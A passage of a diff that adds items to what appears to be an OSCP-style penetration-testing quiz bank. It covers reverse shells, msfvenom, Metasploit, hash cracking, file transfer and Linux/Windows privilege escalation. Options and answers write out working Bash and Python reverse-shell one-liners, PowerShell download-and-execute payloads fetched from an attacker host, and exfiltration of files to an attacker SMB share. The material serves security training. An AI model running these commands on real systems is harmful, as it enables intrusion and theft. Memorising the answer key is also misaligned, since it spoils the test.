+      "question": "You find a deserialization vulnerability in a Java web application. Which tool generates malicious serialized payloads?",
+      "options": [
+        "sqlmap",
+        "hashcat",
+        "ysoserial",
+        "gobuster"
+      ],
+      "correct": 2,
+      "explanation": "ysoserial generates payloads that exploit unsafe Java object deserialization by leveraging gadget chains in common libraries like Apache Commons Collections. These payloads can achieve remote code execution when the application deserializes untrusted data.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 54,
+      "domain": 3,
+      "objective": "3.1",
+      "difficulty": "easy",
+      "question": "Which tool is commonly used to generate reverse shell payloads in various formats (exe, elf, php, etc.)?",
+      "options": [
+        "netcat",
+        "msfvenom",
+        "nmap",
+        "msfconsole"
+      ],
+      "correct": 1,
+      "explanation": "msfvenom is Metasploit's payload generator that creates shellcode and executables in multiple formats. It can generate reverse shells, bind shells, and meterpreter payloads for Windows, Linux, PHP, Python, and many other platforms.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 55,
+      "domain": 3,
+      "objective": "3.1",
+      "difficulty": "medium",
+      "question": "What is the difference between a reverse shell and a bind shell?",
+      "options": [
+        "A bind shell connects back to the attacker; a reverse shell opens a port on the target",
+        "A reverse shell connects back to the attacker's listener; a bind shell opens a port on the target for the attacker to connect to",
+        "A reverse shell is encrypted; a bind shell is not",
+        "A reverse shell only works on Linux; a bind shell only works on Windows"
+      ],
+      "correct": 1,
+      "explanation": "A reverse shell initiates a connection from the target back to the attacker's listener, which helps bypass firewalls that block inbound connections. A bind shell opens a listening port on the target, which requires the attacker to connect inbound.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 56,
+      "domain": 3,
+      "objective": "3.1",
+      "difficulty": "medium",
+      "question": "Which netcat command creates a listener on port 4444 to catch a reverse shell?",
+      "options": [
+        "nc target 4444",
+        "nc -z target 4444",
+        "nc -e /bin/bash 4444",
+        "nc -lvnp 4444"
+      ],
+      "correct": 3,
+      "explanation": "The flags -l (listen), -v (verbose), -n (no DNS), -p (port) create a listener that waits for incoming connections on port 4444. This is the standard way to catch reverse shells during penetration testing.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 57,
+      "domain": 3,
+      "objective": "3.2",
+      "difficulty": "hard",
+      "question": "Which msfvenom command generates a Windows reverse TCP executable payload?",
+      "options": [
+        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe",
+        "msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=4444 -f exe -o shell.exe",
+        "msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.5 LPORT=4444 -f raw",
+        "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf"
+      ],
+      "correct": 0,
+      "explanation": "This command specifies the Windows x64 reverse TCP shell payload, sets the attacker's IP and port, outputs in EXE format. The payload will connect back to the attacker's listener when executed on the target.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 58,
+      "domain": 3,
+      "objective": "3.2",
+      "difficulty": "medium",
+      "question": "In Metasploit, what is the difference between a staged and a stageless payload?",
+      "options": [
+        "Stageless payloads require an internet connection; staged do not",
+        "Staged payloads send a small stager first that downloads the full payload; stageless payloads contain the entire payload in one",
+        "Staged payloads only work with meterpreter; stageless work with any shell",
+        "Staged payloads are larger than stageless payloads"
+      ],
+      "correct": 1,
+      "explanation": "Staged payloads (e.g., windows/meterpreter/reverse_tcp with /) are smaller and download the main payload in a second stage. Stageless payloads (e.g., windows/meterpreter_reverse_tcp with _) contain everything in one, useful when the target cannot reach back for the second stage.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 59,
+      "domain": 3,
+      "objective": "3.2",
+      "difficulty": "hard",
+      "question": "You have a buffer overflow vulnerability in a Windows application. Which register typically holds the return address that you need to overwrite?",
+      "options": [
+        "EIP (Extended Instruction Pointer)",
+        "EAX (Extended Accumulator)",
+        "EBX (Extended Base Register)",
+        "ESP (Extended Stack Pointer)"
+      ],
+      "correct": 0,
+      "explanation": "EIP holds the address of the next instruction to execute. By overwriting EIP with the address of your shellcode or a JMP ESP instruction, you redirect execution flow to your payload, achieving code execution.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 60,
+      "domain": 3,
+      "objective": "3.2",
+      "difficulty": "hard",
+      "question": "During buffer overflow exploitation, what is the purpose of a NOP sled (\\x90)?",
+      "options": [
+        "It increases the size of the payload to fill the buffer completely",
+        "It prevents the application from crashing before the shellcode executes",
+        "It encrypts the shellcode to avoid detection",
+        "It creates a landing zone of no-operation instructions that slide execution into the shellcode regardless of exact jump address"
+      ],
+      "correct": 3,
+      "explanation": "A NOP sled is a sequence of no-operation (0x90) instructions placed before shellcode. It provides a larger target for the return address to land on, as any address within the NOP sled will slide execution forward into the shellcode.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 61,
+      "domain": 3,
+      "objective": "3.3",
+      "difficulty": "medium",
+      "question": "Which tool would you use to brute-force SSH login credentials?",
+      "options": [
+        "hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://target",
+        "john --wordlist=/usr/share/wordlists/rockyou.txt target",
+        "hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt",
+        "nmap --script ssh-brute target"
+      ],
+      "correct": 0,
+      "explanation": "Hydra is a fast, parallelized network login cracker that supports numerous protocols including SSH. The -l flag specifies the username, -P the password wordlist, and ssh:// the protocol and target.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 62,
+      "domain": 3,
+      "objective": "3.3",
+      "difficulty": "easy",
+      "question": "Which tool is used to crack password hashes offline using wordlists and rules?",
+      "options": [
+        "nmap",
+        "john (John the Ripper)",
+        "gobuster",
+        "hydra"
+      ],
+      "correct": 1,
+      "explanation": "John the Ripper is an offline password cracker that supports many hash types and can use wordlists, rules, and incremental modes to crack password hashes extracted from systems or databases.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 63,
+      "domain": 3,
+      "objective": "3.3",
+      "difficulty": "hard",
+      "question": "You obtained NTLM hashes from a Windows machine. Which hashcat mode (-m) cracks NTLM hashes?",
+      "options": [
+        "-m 0",
+        "-m 1800",
+        "-m 1000",
+        "-m 500"
+      ],
+      "correct": 2,
+      "explanation": "Hashcat mode 1000 is for NTLM hashes (NT hash). Mode 0 is for MD5, mode 500 is for MD5crypt (Unix), and mode 1800 is for SHA-512crypt (Unix). NTLM is the primary hash type in Windows Active Directory environments.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 64,
+      "domain": 3,
+      "objective": "3.4",
+      "difficulty": "medium",
+      "question": "Which Python one-liner spawns a Bash reverse shell connecting to 10.10.14.5:4444?",
+      "options": [
+        "python3 -c 'import subprocess; subprocess.call([\"/bin/bash\"])'",
+        "python3 -c 'import os; os.system(\"/bin/bash\")'",
+        "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
+        "python3 -c 'import socket; socket.connect((\"10.10.14.5\", 4444))'"
+      ],
+      "correct": 2,
+      "explanation": "This one-liner creates a socket connection to the attacker, redirects stdin/stdout/stderr (file descriptors 0,1,2) to the socket using os.dup2(), then spawns an interactive bash shell that communicates through the socket.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 65,
+      "domain": 3,
+      "objective": "3.4",
+      "difficulty": "easy",
+      "question": "After catching a reverse shell, you notice it lacks job control and tab completion. Which command upgrades it to a fully interactive TTY?",
+      "options": [
+        "exec /bin/bash",
+        "sh -i",
+        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+        "bash -i"
+      ],
+      "correct": 2,
+      "explanation": "The Python pty module spawns a pseudo-terminal that provides a proper TTY, enabling features like tab completion, command history, and the ability to use interactive programs like sudo and su.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 66,
+      "domain": 3,
+      "objective": "3.4",
+      "difficulty": "hard",
+      "question": "After spawning a PTY with Python, which additional steps fully stabilize the shell for CTRL+C support and proper terminal sizing?",
+      "options": [
+        "Set 'export SHELL=/bin/bash' and restart the connection",
+        "Background the shell with CTRL+Z, run 'stty raw -echo; fg', then 'export TERM=xterm'",
+        "Simply run 'bash -i' again inside the PTY",
+        "Use 'script /dev/null' to create another shell layer"
+      ],
+      "correct": 1,
+      "explanation": "Backgrounding the shell, setting stty to raw mode with echo disabled, and foregrounding it gives full terminal control. Exporting TERM=xterm enables proper terminal handling for programs like clear, nano, and vim.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 67,
+      "domain": 3,
+      "objective": "3.5",
+      "difficulty": "medium",
+      "question": "Which Metasploit command searches for exploit modules related to a specific vulnerability like EternalBlue?",
+      "options": [
+        "grep eternalblue",
+        "search eternalblue",
+        "find eternalblue",
+        "locate eternalblue"
+      ],
+      "correct": 1,
+      "explanation": "The 'search' command in Metasploit's msfconsole searches the module database for exploits, payloads, and auxiliary modules matching the keyword. For EternalBlue, this returns exploit/windows/smb/ms17_010_eternalblue.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 68,
+      "domain": 3,
+      "objective": "3.5",
+      "difficulty": "medium",
+      "question": "In Metasploit, which command sets the target host IP for the selected exploit?",
+      "options": [
+        "set TARGET 10.10.10.5",
+        "set LHOST 10.10.10.5",
+        "set RPORT 10.10.10.5",
+        "set RHOSTS 10.10.10.5"
+      ],
+      "correct": 3,
+      "explanation": "RHOSTS (Remote Hosts) sets the target IP address for the exploit module. LHOST sets the attacker's IP for reverse connections, RPORT sets the target port, and TARGET selects the exploit target configuration.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 69,
+      "domain": 3,
+      "objective": "3.5",
+      "difficulty": "hard",
+      "question": "You found a vulnerable service and want to use Metasploit. Which sequence of commands correctly configures and launches an exploit?",
+      "options": [
+        "run exploit/path/module --target target --payload reverse_tcp",
+        "load exploit/path/module; connect target; execute",
+        "use exploit/path/module; set RHOSTS target; set LHOST attacker; set payload windows/x64/meterpreter/reverse_tcp; exploit",
+        "exploit windows/path/module target; set reverse_tcp"
+      ],
+      "correct": 2,
+      "explanation": "The standard Metasploit workflow is: select the exploit module with 'use', configure RHOSTS (target) and LHOST (attacker), select a compatible payload, then run 'exploit' or 'run' to execute the attack.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 70,
+      "domain": 3,
+      "objective": "3.1",
+      "difficulty": "medium",
+      "question": "Which Bash one-liner creates a reverse shell connection?",
+      "options": [
+        "bash -i < /dev/tcp/10.10.14.5/4444",
+        "bash > /dev/tcp/10.10.14.5/4444",
+        "bash -c 'echo shell > /dev/tcp/10.10.14.5/4444'",
+        "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"
+      ],
+      "correct": 3,
+      "explanation": "This Bash reverse shell redirects stdin, stdout, and stderr through a TCP connection to the attacker's IP and port using Bash's built-in /dev/tcp device. The -i flag makes the shell interactive.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 71,
+      "domain": 3,
+      "objective": "3.3",
+      "difficulty": "hard",
+      "question": "You captured a hash in the format $6$salt$hash. Which hash type is this, and what tool/mode cracks it?",
+      "options": [
+        "MD5crypt; hashcat -m 500",
+        "NTLM; hashcat -m 1000",
+        "SHA-512crypt (Linux shadow); hashcat -m 1800 or john with format sha512crypt",
+        "bcrypt; hashcat -m 3200"
+      ],
+      "correct": 2,
+      "explanation": "The $6$ prefix identifies SHA-512crypt hashes used in modern Linux /etc/shadow files. Hashcat mode 1800 and John the Ripper's sha512crypt format handle this hash type.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 72,
+      "domain": 3,
+      "objective": "3.6",
+      "difficulty": "medium",
+      "question": "Which tool transfers files from your attack machine to a target using a simple HTTP server?",
+      "options": [
+        "python3 -m http.server 80",
+        "ftp put file.txt",
+        "rsync file.txt target:/tmp/",
+        "scp file.txt target:/tmp/"
+      ],
+      "correct": 0,
+      "explanation": "Python's built-in http.server module creates an instant HTTP server in the current directory. The target can then use wget or curl to download files, making it the fastest file transfer method during OSCP engagements.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 73,
+      "domain": 3,
+      "objective": "3.6",
+      "difficulty": "easy",
+      "question": "On a compromised Windows machine with no wget or curl, which built-in command can download files from your attacker server?",
+      "options": [
+        "move http://attacker/file.exe file.exe",
+        "copy http://attacker/file.exe file.exe",
+        "net use http://attacker/file.exe",
+        "certutil -urlcache -split -f http://attacker/file.exe file.exe"
+      ],
+      "correct": 3,
+      "explanation": "certutil is a built-in Windows utility for certificate management that can also download files from URLs. This is a commonly used 'living off the land' technique when dedicated download tools are unavailable.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 74,
+      "domain": 3,
+      "objective": "3.6",
+      "difficulty": "medium",
+      "question": "Which PowerShell command downloads a file from an HTTP server to the target Windows machine?",
+      "options": [
+        "Get-Content http://10.10.14.5/shell.exe > C:\\Temp\\shell.exe",
+        "Start-Process http://10.10.14.5/shell.exe",
+        "Copy-Item http://10.10.14.5/shell.exe C:\\Temp\\shell.exe",
+        "Invoke-WebRequest -Uri http://10.10.14.5/shell.exe -OutFile C:\\Temp\\shell.exe"
+      ],
+      "correct": 3,
+      "explanation": "Invoke-WebRequest (alias: iwr, wget, curl in PowerShell) downloads files from HTTP/HTTPS URLs. The -OutFile parameter specifies where to save the downloaded file on the target system.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 75,
+      "domain": 3,
+      "objective": "3.2",
+      "difficulty": "hard",
+      "question": "In a buffer overflow, which tool helps find a 'JMP ESP' instruction address to redirect execution to your shellcode on the stack?",
+      "options": [
+        "mona.py in Immunity Debugger (!mona jmp -r esp)",
+        "Wireshark",
+        "Burp Suite",
+        "gdb with PEDA extension"
+      ],
+      "correct": 0,
+      "explanation": "mona.py is a plugin for Immunity Debugger that automates finding JMP ESP (or equivalent) gadgets in loaded DLLs. The address of this instruction is used to overwrite EIP, redirecting execution to shellcode on the stack.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 76,
+      "domain": 3,
+      "objective": "3.4",
+      "difficulty": "hard",
+      "question": "Which method allows you to execute a PowerShell reverse shell payload without writing to disk (fileless execution)?",
+      "options": [
+        "Email the PowerShell script to the target user",
+        "Save the payload as shell.ps1 and double-click it",
+        "Use cmd.exe to run the PowerShell script from a file share",
+        "powershell -enc <base64_encoded_payload> or IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
+      ],
+      "correct": 3,
+      "explanation": "Using -enc with base64 or IEX (Invoke-Expression) with DownloadString executes PowerShell code directly in memory without writing files to disk. This evades file-based antivirus detection and forensic artifacts.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 77,
+      "domain": 3,
+      "objective": "3.5",
+      "difficulty": "easy",
+      "question": "Which Metasploit module type gathers information without exploiting a vulnerability?",
+      "options": [
+        "auxiliary",
+        "payload",
+        "post",
+        "exploit"
+      ],
+      "correct": 0,
+      "explanation": "Auxiliary modules perform reconnaissance, scanning, fuzzing, and other tasks without exploitation. They include port scanners, service enumerators, and vulnerability checkers that gather information without compromising the target.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 78,
+      "domain": 3,
+      "objective": "3.3",
+      "difficulty": "medium",
+      "question": "Which John the Ripper command cracks password hashes from a Linux /etc/shadow file using a wordlist?",
+      "options": [
+        "john --show shadow.txt",
+        "john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt",
+        "john --format=raw-md5 shadow.txt",
+        "john --incremental shadow.txt"
+      ],
+      "correct": 1,
+      "explanation": "John the Ripper automatically detects the hash format in shadow files. The --wordlist flag specifies the dictionary to use. rockyou.txt is the most common wordlist, containing over 14 million real-world passwords.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 79,
+      "domain": 3,
+      "objective": "3.1",
+      "difficulty": "hard",
+      "question": "You need to exploit a vulnerable service but the target's firewall blocks all outbound connections. Which shell type should you use?",
+      "options": [
+        "Reverse shell - connect back to your listener",
+        "SSH shell - tunnel through port 22",
+        "Bind shell - open a listening port on the target and connect to it",
+        "Web shell - access through the browser"
+      ],
+      "correct": 2,
+      "explanation": "When outbound connections are blocked, a reverse shell cannot connect back to you. A bind shell opens a listening port on the target, and you connect to it from outside. This requires an inbound port to be reachable, often on an allowed port.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 80,
+      "domain": 3,
+      "objective": "3.6",
+      "difficulty": "medium",
+      "question": "Which tool provides an SMB server on your attacker machine for file transfer to Windows targets?",
+      "options": [
+        "smbclient //target/share",
+        "impacket-smbserver share_name /path/to/files",
+        "python3 -m http.server 445",
+        "net use \\\\attacker\\share"
+      ],
+      "correct": 1,
+      "explanation": "Impacket's smbserver.py creates an SMB share on the attacker's machine. Windows targets can then copy files using 'copy \\\\attacker\\share\\file.exe .' or execute them directly from the UNC path without downloading.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 81,
+      "domain": 3,
+      "objective": "3.2",
+      "difficulty": "hard",
+      "question": "What are 'bad characters' in buffer overflow exploitation, and how do you identify them?",
+      "options": [
+        "Characters that break the exploit (e.g., null bytes \\x00, newlines \\x0a); identified by sending all bytes (\\x01-\\xff) and checking which are missing or corrupted in memory",
+        "Characters that cannot be typed on a keyboard",
+        "Characters that are not printable ASCII",
+        "Characters that cause the debugger to crash"
+      ],
+      "correct": 0,
+      "explanation": "Bad characters are bytes that get modified or truncated during processing (e.g., null bytes terminate strings, newlines end input). Testing involves sending all bytes and examining the buffer in the debugger to find which characters are altered.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 82,
+      "domain": 3,
+      "objective": "3.4",
+      "difficulty": "medium",
+      "question": "Which tool is used to generate cross-platform reverse shell commands for various languages and listeners?",
+      "options": [
+        "Burp Suite",
+        "BloodHound",
+        "Wireshark",
+        "revshells.com or msfvenom"
+      ],
+      "correct": 3,
+      "explanation": "revshells.com is an online generator that creates reverse shell one-liners for Bash, Python, PHP, PowerShell, and many other languages. msfvenom generates binary payloads. Both are essential tools for obtaining shells during engagements.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 83,
+      "domain": 3,
+      "objective": "3.5",
+      "difficulty": "medium",
+      "question": "In Metasploit, which meterpreter command opens an interactive shell on the compromised system?",
+      "options": [
+        "sysinfo",
+        "background",
+        "shell",
+        "getuid"
+      ],
+      "correct": 2,
+      "explanation": "The 'shell' command in meterpreter drops into a system command shell (cmd.exe on Windows, /bin/sh on Linux) for direct OS command execution. 'sysinfo' shows system info, 'getuid' shows current user, and 'background' puts the session in the background.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 84,
+      "domain": 3,
+      "objective": "3.3",
+      "difficulty": "hard",
+      "question": "You extracted hashes from a Windows SAM database. What are the two components of a Windows NTLM hash format?",
+      "options": [
+        "Username and password hash, separated by a colon",
+        "MD5 hash and SHA1 hash, separated by a colon",
+        "LM hash and NT hash, separated by a colon (LM:NT)",
+        "Salt and hash, separated by a dollar sign"
+      ],
+      "correct": 2,
+      "explanation": "Windows stores passwords as LM:NT hash pairs. The LM hash is a legacy DES-based hash (often disabled), and the NT hash is an unsalted MD4 hash of the Unicode password. The NT hash is the primary target for cracking and pass-the-hash attacks.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 85,
+      "domain": 3,
+      "objective": "3.6",
+      "difficulty": "easy",
+      "question": "Which Linux command downloads a file from an HTTP server to the current directory?",
+      "options": [
+        "wget http://10.10.14.5/linpeas.sh",
+        "upload http://10.10.14.5/linpeas.sh",
+        "get http://10.10.14.5/linpeas.sh",
+        "fetch http://10.10.14.5/linpeas.sh"
+      ],
+      "correct": 0,
+      "explanation": "wget is a command-line utility for downloading files from the web. It saves the file to the current directory by default and is available on most Linux distributions, making it the go-to tool for file transfers during engagements.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 86,
+      "domain": 3,
+      "objective": "3.4",
+      "difficulty": "hard",
+      "question": "Which technique creates a PHP reverse shell that connects back to your listener?",
+      "options": [
+        "Use the php-reverse-shell from pentestmonkey, set $ip and $port, and have the server execute it",
+        "Create a PHP file that reads /etc/passwd",
+        "Use PHP's mail() function to send commands",
+        "Include <?php echo 'shell'; ?> in a PHP file"
+      ],
+      "correct": 0,
+      "explanation": "Pentestmonkey's php-reverse-shell.php uses fsockopen() to create a TCP connection back to the attacker, then redirects stdin/stdout/stderr to the socket and spawns /bin/sh. It is the most commonly used PHP reverse shell in OSCP.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 87,
+      "domain": 3,
+      "objective": "3.5",
+      "difficulty": "medium",
+      "question": "Which Metasploit command lists all active sessions after successful exploitation?",
+      "options": [
+        "show sessions",
+        "sessions -l",
+        "list sessions",
+        "get sessions"
+      ],
+      "correct": 1,
+      "explanation": "The 'sessions -l' command lists all active sessions (shells, meterpreter) with their IDs, types, target information, and connection details. You can interact with a specific session using 'sessions -i <id>'.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 88,
+      "domain": 3,
+      "objective": "3.1",
+      "difficulty": "medium",
+      "question": "Which common service running on port 445 is frequently exploited to gain initial access to Windows systems?",
+      "options": [
+        "SSH (Secure Shell)",
+        "RDP (Remote Desktop Protocol)",
+        "SMB (Server Message Block)",
+        "HTTP (HyperText Transfer Protocol)"
+      ],
+      "correct": 2,
+      "explanation": "SMB on port 445 is a common attack vector for Windows systems. Vulnerabilities like EternalBlue (MS17-010), weak credentials, and misconfigured shares make SMB one of the most exploited services in penetration testing.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 89,
+      "domain": 3,
+      "objective": "3.3",
+      "difficulty": "medium",
+      "question": "Which hydra command brute-forces an HTTP POST login form?",
+      "options": [
+        "hydra -l admin -P wordlist.txt target ftp",
+        "hydra -l admin -P wordlist.txt target ssh",
+        "hydra -l admin -P wordlist.txt target http-get /login",
+        "hydra -l admin -P wordlist.txt target http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'"
+      ],
+      "correct": 3,
+      "explanation": "Hydra's http-post-form module takes three colon-separated fields: the login URL path, the POST body with ^USER^ and ^PASS^ placeholders, and a failure string to identify incorrect attempts. This enables automated web login brute-forcing.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 90,
+      "domain": 3,
+      "objective": "3.6",
+      "difficulty": "hard",
+      "question": "On a compromised Windows host without internet access, which PowerShell command can transfer files using SMB to your attacker machine?",
+      "options": [
+        "Invoke-WebRequest -Uri http://10.10.14.5/upload -Method POST -InFile C:\\sensitive.txt",
+        "scp C:\\sensitive.txt attacker@10.10.14.5:/tmp/",
+        "ftp put C:\\sensitive.txt",
+        "Copy-Item C:\\sensitive.txt \\\\10.10.14.5\\share\\sensitive.txt"
+      ],
+      "correct": 3,
+      "explanation": "Windows natively supports SMB file operations. Copy-Item (or 'copy') can transfer files to an Impacket SMB share running on the attacker's machine using a UNC path, requiring no additional tools on the target.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 91,
+      "domain": 4,
+      "objective": "4.1",
+      "difficulty": "easy",
+      "question": "Which automated script is commonly used to enumerate Linux privilege escalation vectors?",
+      "options": [
+        "linpeas.sh (LinPEAS)",
+        "mimikatz",
+        "winpeas.exe",
+        "bloodhound"
+      ],
+      "correct": 0,
+      "explanation": "LinPEAS (Linux Privilege Escalation Awesome Script) is a comprehensive enumeration script that checks for SUID binaries, writable files, cron jobs, kernel vulnerabilities, and hundreds of other privilege escalation vectors on Linux systems.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 92,
+      "domain": 4,
+      "objective": "4.1",
+      "difficulty": "medium",
+      "question": "You find a SUID binary owned by root on a Linux system. Why is this potentially exploitable for privilege escalation?",
+      "options": [
+        "SUID binaries can be modified by any user",
+        "SUID binaries execute with the file owner's privileges (root), regardless of who runs them",
+        "SUID binaries are always vulnerable to buffer overflows",
+        "SUID binaries bypass all file permissions"
+      ],
+      "correct": 1,
+      "explanation": "The SUID (Set User ID) bit causes a binary to run with the permissions of its owner rather than the executing user. A root-owned SUID binary with a vulnerability can be exploited to execute commands as root.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 93,
+      "domain": 4,
+      "objective": "4.1",
+      "difficulty": "medium",
+      "question": "Which command finds all SUID binaries on a Linux system?",
+      "options": [
+        "find / -perm -4000 -type f 2>/dev/null",
+        "grep -r 'SUID' /etc/",
+        "cat /etc/sudoers",
+        "ls -la /usr/bin/"
+      ],
+      "correct": 0,
+      "explanation": "The find command with -perm -4000 searches for files with the SUID bit set. The 2>/dev/null suppresses permission denied errors. The results should be checked against GTFOBins for known privilege escalation techniques.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 94,
+      "domain": 4,
+      "objective": "4.2",
+      "difficulty": "hard",
+      "question": "You run 'sudo -l' and see '(ALL) NOPASSWD: /usr/bin/vim'. How do you escalate to root?",
+      "options": [
+        "sudo vim && su root",
+        "sudo vim /etc/shadow",
+        "vim /root/.ssh/authorized_keys",
+        "sudo vim -c ':!/bin/bash'"
+      ],
+      "correct": 3,
+      "explanation": "Vim can execute shell commands using :!command. Running 'sudo vim -c :!/bin/bash' opens vim as root and immediately spawns a root bash shell. GTFOBins documents these escape techniques for many common utilities.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 95,
+      "domain": 4,
+      "objective": "4.2",
+      "difficulty": "medium",
+      "question": "Which website is the primary reference for Linux binary exploitation techniques for privilege escalation via sudo and SUID?",
+      "options": [
+        "Packet Storm (packetstormsecurity.com)",
+        "ExploitDB (exploit-db.com)",
+        "GTFOBins (gtfobins.github.io)",
+        "CVE Details (cvedetails.com)"
+      ],
+      "correct": 2,
+      "explanation": "GTFOBins is a curated list of Unix binaries that can be exploited to bypass security restrictions. It documents how common utilities like vim, python, find, and others can be abused for privilege escalation, file reads, and shell escapes.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 96,
+      "domain": 4,
+      "objective": "4.3",
+      "difficulty": "hard",
+      "question": "You find a writable cron job script that runs as root every 5 minutes. How do you exploit this for privilege escalation?",
+      "options": [
+        "Append a reverse shell command to the cron script, and it will execute as root on the next run",
+        "Change the cron schedule to run every minute",
+        "Delete the cron job and create a new one",
+        "Copy the cron script to your home directory"
+      ],
+      "correct": 0,
+      "explanation": "If a cron job script is writable by your user but runs as root, you can inject commands (like a reverse shell or chmod +s /bin/bash) into it. When cron executes the script as root, your injected commands run with root privileges.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 97,
+      "domain": 4,
+      "objective": "4.3",
+      "difficulty": "medium",
+      "question": "Which tool monitors running processes to discover cron jobs and other scheduled tasks that may not be visible in crontab?",
+      "options": [
+        "netstat",
+        "pspy",
+        "linpeas",
+        "ps aux"
+      ],
+      "correct": 1,
+      "explanation": "pspy monitors running processes without root permissions by watching /proc. It reveals cron jobs, systemd timers, and other background tasks that may not appear in the user's crontab, including those run by other users.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 98,
+      "domain": 4,
+      "objective": "4.4",
+      "difficulty": "hard",
+      "question": "On a Windows system, you discover the SeImpersonatePrivilege is assigned to your compromised service account. Which tool exploits this for SYSTEM access?",
+      "options": [
+        "JuicyPotato, PrintSpoofer, or GodPotato",
+        "Mimikatz",
+        "BloodHound",
+        "PowerView"
+      ],
+      "correct": 0,
+      "explanation": "SeImpersonatePrivilege allows a process to impersonate any client token. Tools like JuicyPotato, PrintSpoofer, and GodPotato exploit this by coercing a SYSTEM-level process to authenticate, then impersonating that token to gain SYSTEM access.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 99,
+      "domain": 4,
+      "objective": "4.4",
+      "difficulty": "medium",
+      "question": "What is an unquoted service path vulnerability in Windows, and how is it exploited?",
+      "options": [
+        "A Windows service with spaces in its path and no quotes allows planting a malicious executable at an earlier path resolution point",
+        "A service that runs without administrator privileges",
+        "A service that logs credentials in plain text",
+        "A service with a weak password that can be brute-forced"
+      ],
+      "correct": 0,
+      "explanation": "When a Windows service path contains spaces and is not quoted, Windows tries each space-separated part as a potential executable. For example, 'C:\\Program Files\\My App\\service.exe' first tries 'C:\\Program.exe', then 'C:\\Program Files\\My.exe', allowing an attacker to place a malicious binary at these paths.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 100,
+      "domain": 4,
+      "objective": "4.4",
+      "difficulty": "easy",
+      "question": "Which automated script is commonly used to enumerate Windows privilege escalation vectors?",
+      "options": [
+        "gobuster",
+        "linpeas.sh",
+        "nmap",
+        "winPEAS (winpeas.exe)"
+      ],
+      "correct": 3,
+      "explanation": "winPEAS (Windows Privilege Escalation Awesome Script) enumerates Windows systems for misconfigurations, vulnerable services, stored credentials, scheduled tasks, and other vectors that could lead to privilege escalation.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 101,
+      "domain": 4,
+      "objective": "4.1",
+      "difficulty": "easy",
+      "question": "You find a binary with the SUID bit set owned by root. Which command did you most likely use to discover it?",
+      "options": [
+        "cat /etc/passwd | grep root",
+        "netstat -tulnp",
+        "ls -la /etc/shadow",
+        "find / -perm -4000 -type f 2>/dev/null"
+      ],
+      "correct": 3,
+      "explanation": "The find command with -perm -4000 searches for files with the SUID bit set, which is a standard Linux privilege escalation enumeration step. SUID binaries execute with the file owner's privileges, so a root-owned SUID binary can potentially be exploited for root access.",
+      "link": "start-here.html"
+    },
+    {
+      "id": 102,
+      "domain": 4,
+      "objective": "4.1",
+      "difficulty": "medium",
+      "question": "You discover that /usr/bin/python3 has the SUID bit set and is owned by root. Which command would spawn a root shell?",
+      "options": [
+        "python3 -m http.server 80",
+        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+        "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+        "python3 -c 'import subprocess; subprocess.call([\"/bin/bash\"])'"
+      ],
+      "correct": 2,
+      "explanation": "When python3 has the SUID bit set, os.setuid(0) sets the effective user ID to root (0), and os.system(\"/bin/bash\") then spawns a shell running as root. The other options would spawn a shell as the current user or start a web server.",
